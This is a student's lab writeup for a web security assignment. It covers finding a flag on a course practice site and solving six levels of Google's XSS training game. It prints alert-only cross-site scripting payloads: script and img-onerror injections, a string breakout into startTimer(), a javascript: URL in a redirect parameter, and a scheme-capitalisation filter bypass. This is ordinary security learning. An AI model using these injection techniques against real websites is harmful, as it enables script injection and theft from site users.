Writeup 10 - Web
=====

Name: *Ivan Quiles*
Section: *0201*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: *Ivan Quiles*

## Assignment 10 Writeup

### Part 1 (40 Pts)
Honestly for this part of the assignment I was just messing around for a little while attempting different sql commands
on the `http://cornerstoneairlines.co:8080/item?id=`. After messing around for 10 minutes I realized that maybe I should just try
writing different ids since I kept getting the One way ticket to destination page. So I just tried typing the price without 
the decimal. So `1337` as the id. With that I got the flag 'CMSC38R-{y0U-are_the_5ql_n1nja}'. 

### Part 2 (60 Pts)

First level:
Nice and easy. I typed `<script>alert("YO!")</script>`

Second level:
This one took me ages. I couldn't figure out why alert wasn't working and even with all the hints it took me awhile 
to get alert to print right for some reason. The solution was to post a broken image tag and then to get onerror to run successfully.
`<img src="yofjakdfha;lkjsdfalkjhdf.png" onerror="alert(100)"/>`

Third level:
For the third level if you look through the javascript you can see that window.location.hash is used to choose the tab
`https://xss-game.appspot.com/level3/frame#100' onerror ="alert(100)"`. Was what I used to get in. 
Basically just trying to add more tags to the tab loaded. 

Fourth level:
The Fourth one took me awhile. After reading through the hints and putting ' and then ') as the timer. I realized that the 
java script was taking the timer and putting it directly into the `startTimer()` so if you input something like
`');alert(1);var lol = ('` the corresponding function call would become `startTimer('');alert(1);var lol = ('');`. 

Fifth Level:
After getting to the third hint I saw that I had to lookup how to execute javascript without `onclick`. So after 
clicking through stackoverflow I just typed `https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1);` and it worked!

Sixth Level:
Had to use all the hints but after figuring out how to use the google link they gave us all I had to do was put 
'https://xss-game.appspot.com/level6/frame#httpS://www.google.com/jsapi?callback=alert' . I didn't know it till now but apparently 
You can just capitalize http or https and it will work which was surprising but really helpful because of that if statement blocking
http:// from being used.

Overall I learned a lot from these exercises especially since I don't really know anything at all about web development. So this 
took a lot of googling and learning of little facts about web pages.

